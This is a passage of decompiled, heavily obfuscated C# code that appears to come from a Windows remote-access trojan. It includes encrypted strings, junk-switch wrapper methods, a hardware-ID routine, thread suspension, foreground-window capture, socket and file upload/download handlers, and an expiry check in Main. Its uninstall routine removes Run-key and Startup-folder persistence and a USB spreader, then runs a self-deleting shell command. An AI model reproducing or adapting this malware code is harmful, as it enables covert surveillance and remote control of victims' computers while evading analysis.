		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = Class4.smethod_14((ReadOnlyCollectionBase)process_0.Threads, 215, (short)151);
			while (enumerator.MoveNext())
			{
				ProcessThread gparam_ = (ProcessThread)enumerator.Current;
				IntPtr intptr_ = Class2.OpenThread((Class2.Enum1)2, bool_0: false, checked((uint)GClass2.DRV.smethod_16(gparam_, 'ɶ', 'ɀ')));
				if (GClass2.DRV.smethod_17(intptr_, IntPtr.Zero, 518, 588))
				{
					Class2.SuspendThread(intptr_);
					Class2.CloseHandle(intptr_);
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public string Uacode()
	{
		Class2.string_1 = "";
		Class2.smethod_5();
		new Class10().method_6();
		return Class2.string_1;
	}

	public string HWD()
	{
		try
		{
			string string_ = GClass1.smethod_3(Class3.smethod_2(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1ee\ue1c4\ue1ce\ue1c9\ue1d8\ue1d0\ue1f9\ue1cf\ue1d4\ue1cb\ue1d8", 59846), 60444), 58596), 643, 738), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 866, 807);
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return (string)(IComparable<string>)Class10.smethod_2(int_3, '\u00b8', 175);
		}
		catch (Exception gparam_)
		{
			smethod_6(gparam_, '\u02db', 764);
			string result = (string)(IComparable<string>)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue97b\ue96c\ue96c", 62276), 57901), 63510);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string ENB(ref string s)
	{
		return Convert.ToBase64String(Class3.smethod_5(Class3.smethod_10(144, 'ê'), s, 280, 'Ű'));
	}

	public string DEB(ref string s)
	{
		byte[] byte_ = Class4.smethod_10(s, 651, 751);
		return (string)(IComparable<string>)smethod_26(Class3.smethod_10(377, 'ă'), byte_, 980, 923);
	}

	public object STV(string n, string t)
	{
		try
		{
			Class14.smethod_14(Class11.smethod_13(Registry.CurrentUser, GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf85d\uf861\uf868\uf87a\uf879\uf86f\uf87c\uf86b\uf852", 63012), 58572), 59925), string_2, 267, 334), 283, 293), n, (object)t, 379, 311);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void UNS()
	{
		pr(0);
		usb.clean();
		try
		{
			GForm0.smethod_3(GClass1.smethod_3(Class12.smethod_9(798, 888), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf056\uf057\uf04f\uf015\uf04f\uf056\uf04b", 60165), 62059), 59883), 680, 749), 295, 262);
		}
		catch (Exception gparam_)
		{
			smethod_6(gparam_, 'ɚ', 637);
			Class5.smethod_4('á', 148);
		}
		string name = Class4.smethod_6(EXE, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546), "", 909, 'ϵ');
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue540\ue55c\ue555\ue547\ue544\ue552\ue541\ue556\ue56f\ue55e\ue55a\ue550\ue541\ue55c\ue540\ue55c\ue555\ue547\ue56f\ue544\ue55a\ue55d\ue557\ue55c\ue544\ue540\ue56f\ue550\ue546\ue541\ue541\ue556\ue55d\ue547\ue545\ue556\ue541\ue540\ue55a\ue55c\ue55d\ue56f\ue541\ue546\ue55d", 58434), 60143), 60175), writable: true);
		registryKey!.SetValue(name, Class12.smethod_9(620, 520), RegistryValueKind.String);
		Class12.smethod_21(registryKey, Class4.smethod_6(EXE, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546), "", 266, 'Ų'), 477, 506);
		try
		{
			Class4.smethod_0(GClass2.smethod_0(Environment.SpecialFolder.Startup, 'Ǌ', 404), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), string_2, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546), 511, 422);
		}
		catch (Exception gparam_2)
		{
			smethod_6(gparam_2, 'ɤ', 579);
			Class5.smethod_4('Ň', 306);
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue0e6\ue0da\ue0d3\ue0c1\ue0c2\ue0d4\ue0c7\ue0d0", 60058), 59313), 60825), writable: true)!.DeleteSubKey(string_2, throwOnMissingSubKey: false);
		}
		catch (Exception gparam_3)
		{
			smethod_6(gparam_3, '\u009e', 185);
			Class5.smethod_4('Ą', 369);
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uefe9\uefe7\uefee\uefa4\uefef\ueff2\uefef\uefaa\uefa5\uefe1\uefaa\ueffa\uefe3\uefe4\uefed\uefaa\uefba\uefaa\uefac\uefaa\uefee\uefef\uefe6\uefaa\uefa8", 62320), 63677), 58432), NewLateBinding.LateGet(LO, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue6b1\ue682\ue69b\ue69b\ue6b9\ue696\ue69a\ue692", 61704), 63572), 61382), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf08e\uf088\uf08e\uf0cb\uf0d6\uf0c7\uf0da", 60354), 63421), 60599))), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool method_9(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		if (Class11.smethod_7(GClass2.smethod_3(fileInfo_0, 'κ', 'Ϣ').ToLower(), GClass2.smethod_3(fileInfo_1, '©', 'ñ').ToLower(), bool_0: false, 'Ā', 'ĸ') != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = Class11.smethod_25(fileInfo_0, 302, 322);
		DirectoryInfo directoryInfo2 = (DirectoryInfo)(FileSystemInfo)Class11.smethod_25(fileInfo_1, 584, 548);
		do
		{
			if (Class11.smethod_7(smethod_14(directoryInfo, 804, 793).ToLower(), smethod_14(directoryInfo2, 745, 724).ToLower(), bool_0: false, 'Ñ', 'é') == 0)
			{
				directoryInfo = Class10.smethod_18(directoryInfo, 754, 723);
				directoryInfo2 = (DirectoryInfo)(FileSystemInfo)Class10.smethod_18(directoryInfo2, 125, 92);
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public string GTV(string n)
	{
		try
		{
			return Conversions.ToString(Class11.smethod_13(Registry.CurrentUser, GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf85d\uf861\uf868\uf87a\uf879\uf86f\uf87c\uf86b\uf852", 63012), 58572), 59925), string_2, 150, 211), 120, 70).GetValue(n, ""));
		}
		catch (Exception gparam_)
		{
			smethod_6(gparam_, 'ɏ', 616);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_10()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		IContainer container = (icontainer_0 = new Container());
		vmethod_1(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		vmethod_0().set_Enabled(true);
		vmethod_0().set_Interval(50);
		GForm1.smethod_17<ContainerControl>((ContainerControl)(object)this, new SizeF(6f, 13f), 'ɨ', 639);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		GClass2.DRV.smethod_8<Form>((Form)(object)this, new Size(0, 0), 'ƅ', 'ǲ');
		((Form)this).set_ControlBox(false);
		Class14.smethod_15<Form>((Form)(object)this, (FormBorderStyle)0, 767, '\u02ea');
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		Class12.smethod_22<string, Control>((Control)(object)this, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue727", 58368), 62099), 61720), 'į', (short)305);
		GClass2.DRV.smethod_18<Form>((Form)(object)this, 0.0, (short)769, '\u033c');
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	public void DLV(string n)
	{
		try
		{
			Class12.smethod_21(Class11.smethod_13(Registry.CurrentUser, GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf85d\uf861\uf868\uf87a\uf879\uf86f\uf87c\uf86b\uf852", 63012), 58572), 59925), string_2, 402, 471), 714, 756), n, 941, 906);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_1)
	{
		EventHandler eventHandler = method_4;
		Timer val = timer_0;
		if (val != null)
		{
			val.remove_Tick(eventHandler);
		}
		Timer val2 = (timer_0 = (Timer)(object)(Component)(object)timer_1);
		val = timer_0;
		if (val != null)
		{
			val.add_Tick(eventHandler);
		}
	}

	private string method_11()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		GetWindowText(GetForegroundWindow(), stringBuilder, smethod_27(stringBuilder, 865, 871));
		return stringBuilder.ToString();
	}

	[SpecialName]
	private void _Lambda_0024__R37_002D1(object sender, SessionEndingEventArgs e)
	{
		method_7();
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D2(object sender, EventArgs e)
	{
		method_5();
	}

	public string RandomVariable(int minamount, int maxamount)
	{
		Random random = new Random();
		string text = null;
		string text2 = (string)(IEnumerable<char>)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮮﮨ\ufbbaﮭﮫﮦﮪ\ufbb6ﮰﮯ\ufbbeﮬ\ufbbb\ufbb9\ufbb8\ufbb7\ufbb5\ufbb4\ufbb3ﮥﮧ\ufbbcﮩ\ufbbdﮱ\ufbb2ﮎﮈﮚﮍﮋﮆﮊﮖﮐﮏﮓﮔﮗﮕﮕﮘﮙﮛﮌﮞﮅﮇﮜﮉﮝﮑﮒﯮﯭﯬﯫﯪﯩﯨﯧﯦﯯ", 61564), 58453), 61297);
		checked
		{
			int num = Class3.smethod_14(random, minamount + 1, maxamount, 506, 387);
			for (int i = 1; i <= num; i++)
			{
				int index = (int)smethod_10(Conversion.Int((float)(GClass2.DRV.smethod_1(text2, 174, 240) - 2) * Class3.smethod_15('\u0302', 812)) + 1f, 'ΐ', 'Ρ');
				text = (string)(IComparable<string>)GClass1.smethod_3(text, GClass1.smethod_2(text2[index], 961, 'ϓ'), 699, 766);
			}
			string text3 = (string)(IComparable)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮮﮨ\ufbbaﮭﮫﮦﮪ\ufbb6ﮰﮯ\ufbbeﮬ\ufbbb\ufbb9\ufbb8\ufbb7\ufbb5\ufbb4\ufbb3ﮥﮧ\ufbbcﮩ\ufbbdﮱ\ufbb2ﮎﮈﮚﮍﮋﮆﮊﮖﮐﮏﮓﮔﮗﮕﮕﮘﮙﮛﮌﮞﮅﮇﮜﮉﮝﮑﮒﯮﯭﯬﯫﯪﯩﯨﯧﯦﯯ", 61564), 58453), 61297);
			return Conversions.ToString(text3[random.Next(0, text3.Length - 1)]) + text;
		}
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D3(object object_2)
	{
		upf(Conversions.ToString(object_2));
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D4(object object_2)
	{
		getf(Conversions.ToString(object_2));
	}

	[STAThread]
	public static void Main()
	{
		if (Class14.smethod_2(Class11.smethod_1(704, 'ʸ'), new DateTime(635781201245485470L), 939, 1002))
		{
			throw new Exception();
		}
		if (Class14.smethod_2(Class11.smethod_1(105, '\u0011'), new DateTime(635781201195582616L), 232, 169))
		{
			throw new Exception();
		}
		if (DateTime.Now > new DateTime(635781201100737191L))
		{
			throw new Exception();
		}
		Application.Run((Form)(object)((Class6.Class7)Class6.Object_2).method_1());
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D5()
	{
		gtx();
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D6(string string_5)
	{
		stx(string_5);
	}

	[SpecialName]
	private void _Lambda_0024__R44_002D7()
	{
		ctx();
	}

	internal static void smethod_1<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : EventHandler where U : Form
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ char_0) - 39) ^ num)
			{
			case 0:
				((Form)gparam_0).add_Load((EventHandler)gparam_1);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static Assembly smethod_2(int int_1, char char_0)
	{
		int num = 0;
		Assembly result = (((char_0 ^ int_1) - 16) ^ 0) switch
		{
			0 => (Assembly)(ISerializable)Assembly.GetExecutingAssembly(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_3<T>(T gparam_0, short short_0, int int_1) where T : string
	{
		int num = 0;
		int result = (((short_0 ^ int_1) - 84) ^ 0) switch
		{
			0 => Strings.Len((string)gparam_0), 
			1 => Conversions.ToInteger((string)gparam_0), 
			_ => 0, 
		};
		num++;
		return result;
	}

	internal static Socket smethod_4<T>(T gparam_0, short short_0, short short_1) where T : TcpClient
	{
		int num = 0;
		Socket result;
		do
		{
			result = (((short_0 ^ short_1) - 62) ^ num) switch
			{
				0 => gparam_0.Client, 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static bool smethod_5<T>(T gparam_0, int int_1, SelectMode selectMode_0, int int_2, char char_0) where T : Socket
	{
		int num = 0;
		bool result;
		int num2;
		do
		{
			result = (((char_0 ^ int_2) - 114) ^ num) switch
			{
				0 => gparam_0.Poll(int_1, selectMode_0), 
				_ => true, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_6<T>(T gparam_0, char char_0, short short_0) where T : Exception
	{
		int num = 0;
		do
		{
			switch (((char_0 ^ short_0) - 39) ^ num)
			{
			case 0:
				ProjectData.SetProjectError((Exception)gparam_0);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static string smethod_7<T>(T gparam_0, char char_0, char char_1) where T : StringBuilder
	{
		int num = 0;
		string result = (((char_1 ^ char_0) - 63) ^ 0) switch
		{
			0 => (string)(IConvertible)gparam_0.ToString(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static bool smethod_8<T>(T gparam_0, char char_0, int int_1) where T : Keyboard
	{
		int num = 0;
		bool result = (((char_0 ^ int_1) - 89) ^ 0) switch
		{
			0 => ((Keyboard)gparam_0).get_ShiftKeyDown(), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static object smethod_9<T>(T gparam_0, object[] object_2, string[] string_5, short short_0, int int_1)
	{
		int num = 0;
		object result;
		do
		{
			result = (((short_0 ^ int_1) - 48) ^ num) switch
			{
				0 => NewLateBinding.LateIndexGet((object)gparam_0, object_2, string_5), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static double smethod_10(double double_0, char char_0, char char_1)
	{
		int num = 0;
		double result = (((char_0 ^ char_1) - 49) ^ 0) switch
		{
			0 => Math.Round(double_0), 
			_ => 0.09554872085287511, 
		};
		num++;
		return result;
	}

	internal static bool smethod_11(IntPtr intptr_0, IntPtr intptr_1, int int_1, short short_0)
	{
		int num = 0;
		bool result;
		do
		{
			result = (((short_0 ^ int_1) - 56) ^ num) switch
			{
				0 => intptr_0 == intptr_1, 
				_ => false, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static bool smethod_12<T>(T gparam_0, char char_0, int int_1) where T : string
	{
		int num = 0;
		bool result = (((char_0 ^ int_1) - 82) ^ 0) switch
		{
			0 => File.Exists(gparam_0), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static void smethod_13<T>(T gparam_0, Size size_0, short short_0, char char_0) where T : Control
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 115) ^ 0)
		{
		case 0:
			((Control)gparam_0).set_Size(size_0);
			break;
		}
		num++;
	}

	internal static string smethod_14<T>(T gparam_0, int int_1, short short_0) where T : DirectoryInfo
	{
		int num = 0;
		string result = (((short_0 ^ int_1) - 61) ^ 0) switch
		{
			0 => (string)(IComparable<string>)((DirectoryInfo)gparam_0).get_Name(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string[] smethod_15<T>(T gparam_0, short short_0, int int_1) where T : RegistryKey
	{
		int num = 0;
		string[] result = (((short_0 ^ int_1) - 46) ^ 0) switch
		{
			0 => (string[])(Array)gparam_0.GetSubKeyNames(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_16<T>(T gparam_0, int int_1, char char_0, short short_0) where T : Control
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_0 ^ char_0) - 25) ^ num)
			{
			case 0:
				((Control)gparam_0).set_TabIndex(int_1);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_17<T>(T gparam_0, SizeF sizeF_0, char char_0, int int_1) where T : ContainerControl
	{
		int num = 0;
		switch (((char_0 ^ int_1) - 23) ^ 0)
		{
		case 0:
			((ContainerControl)gparam_0).set_AutoScaleDimensions(sizeF_0);
			break;
		}
		num++;
	}

	internal static object smethod_18<T>(T gparam_0, short short_0, int int_1)
	{
		int num = 0;
		object result;
		do
		{
			result = (((int_1 ^ short_0) - 95) ^ num) switch
			{
				0 => RuntimeHelpers.GetObjectValue(gparam_0), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static long smethod_19<T>(T gparam_0, char char_0, int int_1) where T : FileInfo
	{
		int num = 0;
		long result = (((char_0 ^ int_1) - 13) ^ 0) switch
		{
			0 => gparam_0.Length, 
			_ => 15L, 
		};
		num++;
		return result;
	}

	internal static void smethod_20<T, U>(T gparam_0, U gparam_1, char char_0, int int_1) where T : string where U : string
	{
		int num = 0;
		do
		{
			switch (((int_1 ^ char_0) - 88) ^ num)
			{
			case 2:
				Directory.Move(gparam_0, gparam_1);
				break;
			case 1:
				File.Move(gparam_0, gparam_1);
				break;
			case 0:
				File.WriteAllText(gparam_0, gparam_1);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static Process[] smethod_21(int int_1, short short_0)
	{
		int num = 0;
		Process[] result = (((int_1 ^ short_0) - 122) ^ 0) switch
		{
			0 => Process.GetProcesses(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_22<T>(T gparam_0, char char_0, int int_1) where T : Process
	{
		int num = 0;
		int result = (((int_1 ^ char_0) - 75) ^ 0) switch
		{
			0 => gparam_0.Id, 
			_ => int_1, 
		};
		num++;
		return result;
	}

	internal static DateTime smethod_23<T>(T gparam_0, int int_1, int int_2) where T : Process
	{
		int num = 0;
		DateTime result = (((int_2 ^ int_1) - 87) ^ 0) switch
		{
			0 => gparam_0.StartTime, 
			_ => default(DateTime), 
		};
		num++;
		return result;
	}

	internal static void smethod_24<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : DataReceivedEventHandler where U : Process
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 117) ^ 0)
		{
		case 0:
			gparam_0.OutputDataReceived += gparam_1;
			break;
		case 1:
			gparam_0.ErrorDataReceived += gparam_1;
			break;
		}
		num++;
	}

	internal static void smethod_25<T>(T gparam_0, char char_0, char char_1) where T : ServiceController
	{
		int num = 0;
		switch (((char_0 ^ char_1) - 80) ^ 0)
		{
		case 0:
			((ServiceController)gparam_0).Start();
			break;
		case 1:
			((ServiceController)gparam_0).Stop();
			break;
		}
		num++;
	}

	internal static string smethod_26<T>(T gparam_0, byte[] byte_0, int int_1, short short_0) where T : Encoding
	{
		int num = 0;
		string result = (((short_0 ^ int_1) - 79) ^ 0) switch
		{
			0 => (string)(ICloneable)gparam_0.GetString(byte_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_27<T>(T gparam_0, short short_0, short short_1) where T : StringBuilder
	{
		int num = 0;
		int result = (((short_0 ^ short_1) - 6) ^ 0) switch
		{
			0 => gparam_0.Capacity, 
			_ => 9, 
		};
		num++;
		return result;
	}
}
